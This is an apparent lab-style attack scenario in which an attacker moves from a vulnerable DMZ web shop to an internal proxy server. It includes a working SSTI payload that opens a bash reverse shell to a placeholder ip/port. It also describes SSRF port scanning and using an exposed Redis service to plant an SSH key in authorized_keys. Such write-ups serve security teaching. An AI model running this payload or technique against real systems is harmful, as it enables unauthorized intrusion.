# Scenario
> Internet → Web Server (DMZ) → Proxy Server (Internal)

## Obtaining a Shell on the Web Server
The attacker accesses the EC site hosted on the Web Server, which is vulnerable to SSTI and SSRF.
By exploiting the SSTI vulnerability, the attacker can execute the following command to establish a reverse shell and obtain a shell on the Web Server:
```
{{().__class__.__bases__[0].__subclasses__()[405](['bash -c "bash -i >& /dev/tcp/ip/port 0>&1"'], shell=True)}}
```

## Lateral Movement
The attacker identifies the internal Proxy Server's hostname (proxy-server.internal) from the HTTP headers used when registering a profile photo.
The attacker then exploits the SSRF vulnerability to scan for open ports on the internal Proxy Server. The attacker discovers that SSH (port 22) and Redis (port 6637) are accessible.
Using the shell obtained on the Web Server, the attacker opens a socket connection to the Redis service on the Proxy Server and sends commands to Redis. This allows the attacker to write their own public key to the Proxy Server under the authorized_keys file.
The attacker can then authenticate to the Proxy Server via SSH using the corresponding private key and obtain a shell on the Proxy Server.
